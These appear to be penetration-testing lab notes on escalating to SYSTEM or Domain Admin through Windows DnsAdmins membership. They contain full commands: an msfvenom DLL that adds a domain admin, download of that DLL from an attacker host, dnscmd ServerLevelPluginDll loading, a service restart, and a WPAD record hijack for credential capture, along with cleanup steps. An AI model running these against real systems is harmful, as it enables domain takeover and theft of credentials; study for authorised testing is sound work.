# DnsAdmins Group — Windows PrivEsc

## Background
- Members have access to DNS info on the network.
- Windows DNS service supports **custom plugins** — can call external functions to resolve queries outside locally hosted zones.
- **DNS service runs as `NT AUTHORITY\SYSTEM`** → DnsAdmins membership can be leveraged to escalate to SYSTEM on a Domain Controller (or any dedicated DNS server for the domain).

### Attack Mechanism
1. DNS management happens over RPC.
2. `ServerLevelPluginDll` setting lets a DnsAdmins member load a **custom DLL with zero path verification** via the `dnscmd` utility.
3. Running the `dnscmd` command populates: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
4. On DNS service restart, the DLL at that path is loaded (e.g. from a network share the DC's machine account can reach).
5. Attacker's DLL executes — can spawn a reverse shell, add a domain admin, or load Mimikatz-as-DLL for credential dumping.

---

## Exploitation Walkthrough — Malicious ServerLevelPluginDll

### Step 1 — Generate a malicious DLL
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Step 2 — Host it via HTTP server
```bash
python3 -m http.server 7777
```

### Step 3 — Download to target
```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

### Step 4 — Confirm the privilege requirement
As a **non-privileged user**:
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# ERROR_ACCESS_DENIED
```
→ Fails as expected. Only DnsAdmins members can set this.

### Step 5 — Confirm group membership
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

### Step 6 — Load the DLL as a DnsAdmins member
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# Registry property serverlevelplugindll successfully reset.
```
> Must specify the **full path** to the DLL or the attack fails.
> DnsAdmins members can only use `dnscmd` (not direct registry access) — this command works because it's a supported interface for the group.

### Step 7 — Restart DNS service (if permitted)
DnsAdmins membership doesn't inherently grant service restart rights — but sysadmins commonly allow it.

**Check user's SID:**
```cmd
wmic useraccount where name="netadm" get sid
```

**Check permissions on the DNS service:**
```cmd
sc.exe sdshow DNS
```
- Look for `RPWP` (SERVICE_START / SERVICE_STOP) tied to your SID in the SDDL string.

**Stop and start the service:**
```cmd
sc stop dns
sc start dns
```
- On restart, the malicious DLL executes.

### Step 8 — Confirm success
```cmd
net group "Domain Admins" /dom
```
```
Members
-------
Administrator            netadm
```


Make sure you restart/log out machine if you are trying to access Administrator folder


---

## ⚠️ Cleanup — Critical

Stopping/restarting DNS on a DC is **highly destructive** — can take down DNS for the entire AD environment. **Always get explicit client permission before attempting**, and be prepared to fully revert.

**Steps (require elevated local/domain admin access):**

1. **Confirm the malicious registry key exists:**
```cmd
reg query \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
Look for: `ServerLevelPluginDll REG_SZ adduser.dll`

2. **Delete it:**
```cmd
reg delete \\<target_ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

3. **Restart DNS service:**
```cmd
sc.exe start dns
```

4. **Verify it's running normally:**
```cmd
sc query dns
# STATE: RUNNING
```
- Also confirm functionality with an `nslookup` against localhost or another domain host.

---

## Alternative Payload — mimilib.dll
- Created by the Mimikatz author; modify `kdns.c`'s `kdns_DnsPluginQuery` function to run a reverse shell one-liner or arbitrary command via `system("ENTER COMMAND HERE")`.
- Same load mechanism as above — swap in this DLL instead of a custom msfvenom payload.

---

## Alternative Attack — WPAD Record Hijacking

### Concept
- DnsAdmins membership grants rights to **disable the global query block list** — which by default blocks WPAD and ISATAP name resolution (both historically vulnerable to hijacking).
- With the block list disabled, any domain user could otherwise create a malicious WPAD DNS record — but DnsAdmins gives you the ability to remove that protection first.
- Once WPAD resolves to an attacker-controlled IP, machines using default WPAD settings will **proxy their traffic through the attacker**.
- Enables tools like **Responder** or **Inveigh** to capture/crack hashes, or perform **SMB relay** attacks.

### Step 1 — Disable global query block list
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Step 2 — Add a malicious WPAD record
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---

## Key Takeaway
DnsAdmins membership is a **direct SYSTEM/Domain Admin path** on any DC running DNS (the common case): abuse `ServerLevelPluginDll` to load an arbitrary DLL on service restart, or disable the global query block list to weaponize WPAD for credential capture/relay. Both techniques are **highly destructive to DNS availability** — treat as a last-resort, client-approved action with a clear rollback plan.